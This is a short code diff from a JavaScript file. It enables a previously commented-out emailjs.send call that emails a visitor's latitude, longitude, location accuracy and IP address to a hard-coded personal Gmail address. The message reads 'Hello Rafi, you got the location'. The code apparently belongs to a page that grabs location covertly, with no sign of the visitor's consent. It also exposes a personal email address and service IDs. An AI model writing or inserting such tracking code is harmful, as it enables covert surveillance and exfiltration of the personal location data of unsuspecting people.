@@ -812,20 +812,20 @@
 
     console.log(`Latitude: ${lat}, Longitude: ${lng}`);
     console.log(`Accurate within ${accu} meters.`);
-    // emailjs.send(
-    //   'service_v8ava8a',
-    //   'template_rd1m53j',
-    //   {
-    //     to_email: 'rafee.infinix@gmail.com',
-    //     message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}`
-    //   }
-    // )
-    // .then(() => {
-    //   console.log('Email sent');
-    // })
-    // .catch(err => {
-    //   console.error(err);
-    // });
+    emailjs.send(
+      'service_v8ava8a',
+      'template_rd1m53j',
+      {
+        to_email: 'rafee.infinix@gmail.com',
+        message: `Hello Rafi, you got the location: ${lat}, ${lng}, with accuracy of ${accu} and the ip is : ${ip}`
+      }
+    )
+    .then(() => {
+      console.log('Email sent');
+    })
+    .catch(err => {
+      console.error(err);
+    });
     // sendCustomSMS();
     // if (openSms) {
     //   openSmsModal(lat, lng, accu);
